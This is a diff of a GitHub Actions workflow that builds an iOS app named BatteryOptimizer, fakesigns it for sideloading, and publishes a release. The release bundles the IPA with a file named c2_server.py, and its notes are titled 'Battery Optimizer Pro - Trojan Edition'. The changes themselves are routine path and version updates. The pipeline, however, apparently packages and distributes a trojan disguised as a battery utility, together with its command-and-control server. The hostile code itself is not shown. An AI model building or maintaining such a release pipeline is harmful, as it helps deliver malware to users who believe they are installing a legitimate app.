@@ -12,7 +12,7 @@ jobs:
     
     steps:
     - name: Checkout code
-      uses: actions/checkout@v3
+      uses: actions/checkout@v4
     
     - name: Setup Xcode
       uses: maxim-lobanov/setup-xcode@v1
@@ -26,13 +26,11 @@ jobs:
     
     - name: Generate icons
       run: |
-        cd test
         python3 create_icon.py
         python3 generate_icons.py
     
     - name: Build IPA
       run: |
-        cd test
         xcodebuild -project BatteryOptimizer.xcodeproj \
           -scheme BatteryOptimizer \
           -configuration Release \
@@ -49,7 +47,7 @@ jobs:
     
     - name: Sign IPA (fakesign for sideload)
       run: |
-        cd test/build
+        cd build
         ldid -S BatteryOptimizer.app
         mkdir Payload
         cp -r BatteryOptimizer.app Payload/
@@ -59,8 +57,8 @@ jobs:
       uses: softprops/action-gh-release@v1
       with:
         files: |
-          test/build/BatteryOptimizer.ipa
-          test/c2_server.py
+          build/BatteryOptimizer.ipa
+          c2_server.py
         body: |
           ## Battery Optimizer Pro - Trojan Edition
           
@@ -88,7 +86,7 @@ jobs:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
     
     - name: Upload artifacts
-      uses: actions/upload-artifact@v3
+      uses: actions/upload-artifact@v4
       with:
         name: BatteryOptimizer-IPA
-        path: test/build/BatteryOptimizer.ipa
+        path: build/BatteryOptimizer.ipa
